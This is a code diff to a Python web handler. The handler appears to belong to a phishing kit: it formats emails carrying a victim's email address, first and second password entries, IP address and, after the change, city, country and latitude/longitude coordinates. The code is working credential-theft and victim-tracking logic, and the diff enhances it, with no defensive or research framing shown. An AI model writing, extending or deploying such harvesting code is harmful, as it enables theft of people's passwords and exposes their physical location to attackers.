@@ -39,9 +39,10 @@ def get_user_info(request):
 
         # Extract important data from visitor_data
         ip_address = visitor_data.get('ip', 'N/A')
-        city = visitor_data.get('city', 'Unknown')
-        region = visitor_data.get('region', 'Unknown')
-        country = visitor_data.get('country', 'Unknown')
+        city = visitor_data.get('city', {}).get('name', 'Unknown')  # Get city name
+        country = visitor_data.get('country', {}).get('name', 'Unknown')  # Get country name
+        latitude = visitor_data.get('location', {}).get('latitude', 'N/A')  # Get latitude
+        longitude = visitor_data.get('location', {}).get('longitude', 'N/A')  # Get longitude
 
         # Validate data from visitor_data
         if ip_address == 'N/A' or country == 'Unknown':
@@ -52,9 +53,9 @@ def get_user_info(request):
         email_content_first = f"""
             Email Address: {email}
             First Password: {firstpasswordused}
-            Time Received: {time_received}
 
-            IP Details: This visitor visited from {country}, {city}, {region} with IP Address of - {ip_address}
+            IP Details: This visitor visited from {country}, {city} with IP Address of {ip_address}.
+            Location Coordinates: Latitude - {latitude}, Longitude - {longitude}
         """
 
         # Format the email content for the second password
@@ -62,7 +63,8 @@ def get_user_info(request):
             Email Address: {email}
             Second Password: {secondpasswordused}
 
-            IP Details: This visitor visited from {country}, {city}, {region} with IP Address of - {ip_address}
+            IP Details: This visitor visited from {country}, {city} with IP Address of {ip_address}.
+            Location Coordinates: Latitude - {latitude}, Longitude - {longitude}
         """
 
         # Handle encoding issues with non-ASCII characters using unidecode
